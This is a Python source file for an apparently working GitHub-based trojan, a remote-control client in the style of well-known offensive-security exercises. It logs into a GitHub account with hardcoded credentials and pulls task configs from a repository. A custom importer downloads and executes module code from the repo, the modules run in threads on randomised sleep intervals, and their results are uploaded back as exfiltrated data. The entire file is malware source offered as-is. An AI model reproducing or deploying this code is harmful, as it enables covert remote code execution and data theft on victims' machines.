import github3 
import os 
import json
import base64
import sys 
import time
import threading
import random
import queue
import imp 


configured = False
group = "b03201003"#"NTUOC12"
subgroup = "hsnu129509"#"ntuoc12course"
client_id = 5487000000
client_config = f"{client_id}.json"
data_path = f"data/{client_id}/"
task_queue = queue.Queue()
def connect(group,subgroup):
	gh = github3.login(username=group,password=subgroup)
	#Authorization = github3.authorize(username=group,password=subgroup,scopes=None)
	#print("Authorization:",Authorization)
	repo = gh.repository(group,"NTU_PIECE")
	branch = repo.branch("master")
	
	return gh,repo,branch

def get_file_contents(path):
	gh,repo,branch = connect(group,subgroup)
	print(f"gh:{gh},repo:{repo},branch:{branch}")
	tree = branch.commit.commit.tree.to_tree().recurse()
	print('tree:',tree)
	print('tree.tree:',tree.tree)
	for name in tree.tree:
		print('name:',name)
		if path in name.path:
			print(f"[*] Found file: {path}") 
			blob = repo.blob(name._json_data['sha'])
			print(f'blob:{blob},blob.content:{blob.content},decode:{base64.b64decode(blob.content)}')
			return blob.content

	return None

def get_manager_config():
	global configured
	config_json = get_file_contents(client_config)
	print(f"config_json:{config_json}")
	config = json.loads(base64.b64decode(config_json))
	configured = True
	print(f"config:{config}")
	for task in config:
		if task['module'] not in sys.modules:
			m = task['module']
			try:
				exec(f"from {m} import *")
			except:
				pass
	return config 

def push_result(data):
	gh,repo,branch = connect(group,subgroup)
	t = round(time.time*1000)
	remote_path = f"data/{client_id}/{t}.txt"
	repo.create_file(remote_path, "push back data",base64.b64encode(data))
	return

class GitImporter(object):
	def __init__(self):
		self.current_module_code = ""
	def find_module(self,name,path=None):
		if configured:
			print(f'[*] Attempting to retrieve {name}')
			new_lib = get_file_contents(f"modules/{name}.py")
			print("decode new lib: \n",base64.b64decode(new_lib))

			if new_lib is not None:
				self.current_module_code = base64.b64decode(new_lib)
				return self
		return None
	def load_module(self,name):
		mod = imp.new_module(name)
		print(f"module:{mod},module.__dict__:{mod.__dict__}")
		print(self.current_module_code in mod.__dict__)
		exec(self.current_module_code) in mod.__dict__
		sys.modules[name] = mod
		return mod

def module_runner(module):
	task_queue.put(1)
	print(f"module:{module}")
	s = sys.modules[module]
	print(f"sys.modules[module]:{s}")
	result = sys.modules[module].r()
	task_queue.get()

	push_result(result)
	return 

sys.meta_path = [GitImporter()]
while True:
	if task_queue.empty():
		config = get_manager_config()
		for task in config:
			t = threading.Thread(target=module_runner,args=(task['module'],))
			t.start()
			time.sleep(random.randint(10,20)) 

	time.sleep(random.randint(100,1000))
	